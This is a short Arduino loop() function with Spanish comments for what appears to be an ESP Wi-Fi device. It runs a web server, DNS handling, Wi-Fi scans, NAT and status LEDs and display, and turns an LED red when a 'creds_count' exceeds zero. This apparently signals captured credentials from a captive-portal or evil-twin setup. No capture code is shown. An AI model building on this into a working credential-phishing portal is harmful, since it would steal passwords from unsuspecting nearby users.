void loop() {
  server.handleClient();
  dns_loop();
  manejar_wifi_sta();
  gestionar_scan();       // lanza/recoge escaneos WiFi async

  // LED cada 2s
  if (millis() - t_led >= 2000) {
    t_led = millis();
    if      (creds_count > 0)           led_rojo();
    else if (natActivo)                  led_cyan();
    else if (WiFi.softAPgetStationNum()) led_amarillo();
    else                                 led_verde();
  }

  // OLED cada 1s (rotación de pantallas la controla gestionar_oled)
  if (millis() - t_oled >= 1000) {
    t_oled = millis();
    gestionar_oled();
  }

  // Status cada 15s + auto-test de internet del ESP (para diagnostico)
  if (millis() - t_serial >= 15000) {
    t_serial = millis();
    mostrar_estado();
    if (natActivo) test_internet_esp();
  }

  delay(5);
}
